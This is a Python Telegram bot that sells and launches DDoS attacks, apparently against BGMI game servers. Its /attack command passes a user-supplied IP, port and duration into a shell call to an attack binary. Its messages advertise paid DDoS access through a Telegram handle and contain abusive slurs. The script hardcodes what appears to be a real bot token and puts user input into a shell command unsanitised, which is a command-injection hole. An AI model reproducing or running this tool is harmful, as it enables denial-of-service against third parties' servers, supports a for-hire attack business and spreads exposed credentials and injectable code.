import os
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from telegram.error import TelegramError

TELEGRAM_BOT_TOKEN = '8031510326:AAHWNQ342W4pH97eMefegHD64M1RsrFNnik'
ALLOWED_USER_ID = 6485336955
bot_access_free = True  

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*📢𝗝𝗔𝗬 𝗦𝗛𝗥𝗘𝗘 𝗥𝗔𝗠 🟥*\n\n"
        "*🇸 🇦 🇱 🇦 🇲  🇼 🇦 🇱 🇪  🇰 🇺 🇲 *"
        "*𝗡𝗔𝗠𝗔𝗦𝗧𝗘 🙏*"
        "*𝗦𝗖𝗔𝗠𝗠𝗘𝗥 𝗞𝗜 𝗠𝗔𝗔 𝗞𝗔 𝗕𝗦𝗗𝗞*"
        "*𝗨𝗦𝗘 /attack 𝗜𝗣 𝗣𝗢𝗥𝗧 𝗧𝗜𝗠𝗘 𝗧𝗢 𝗙𝗨𝗖𝗞 𝗕𝗚𝗠𝗜*"    "*𝙎𝘼𝙏𝙈𝙀𝙑 𝙅𝘼𝙔𝘼𝙏𝙀 🇮🇳🇮🇳 ☜︎︎︎(𝙅𝙊 𝙄𝙎𝙆𝙊 𝙃𝘼𝙏𝘼𝙔𝘼 𝙃𝙊 𝙎𝘼𝘽𝙎𝙀 𝘽𝘼𝘿𝘼 𝙍#𝙉𝘿𝙄*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./Moin {ip} {port} {duration} 300",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        await context.bot.send_message(chat_id=chat_id, text="*✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗗𝗢𝗡𝗘 ➪ 𝘂𝘀𝗲 /𝗮𝘁𝘁𝗮𝗰𝗸 𝘁𝗼 𝗿𝗲𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗮𝘁𝘁𝗮𝗰𝗸 𒊹︎⭐︎︎*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user issuing the command

    # Check if the user is allowed to use the bot
    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌𝗣𝗔𝗜𝗗 𝗗𝗠 - @Vip_Ddos_07 𝗙𝗢𝗥 𝗔𝗖𝗖𝗘𝗦𝗦*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*𒊹ꕥ𝗨𝗦𝗔𝗚𝗘 : /𝗮𝘁𝘁𝗮𝗰𝗸 𝗜𝗣 𝗣𝗢𝗥𝗧 𝗧𝗜𝗠𝗘 DM -@Vip_Ddos_07 𝗙𝗢𝗥 𝗣𝗔𝗜𝗗 𝗙𝗜𝗟𝗘𝗦 💥©️*", parse_mode='Markdown')
        return

    ip, port, duration = args
    await context.bot.send_message(chat_id=chat_id, text=( 
        f"*𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐀𝐆 𝐆𝐀𝐘𝐀 𝐇𝐀𝐈 𖤍⚔️*\n"
        f"*𒊹︎𝐓𝐀𝐑𝐆𝐄𝐓📢︎: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds𖤍☯︎*\n"
        f"*🔥 Let the battlefield ignite! 💥 𝗗𝗠- @Vip_Ddos_07 𝗙𝗢𝗥 𝗢𝗡𝗟𝗬 𝗣𝗔𝗜𝗗 𝗗𝗗𝗢𝗦*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))

    application.run_polling()

if __name__ == '__main__':
    main()
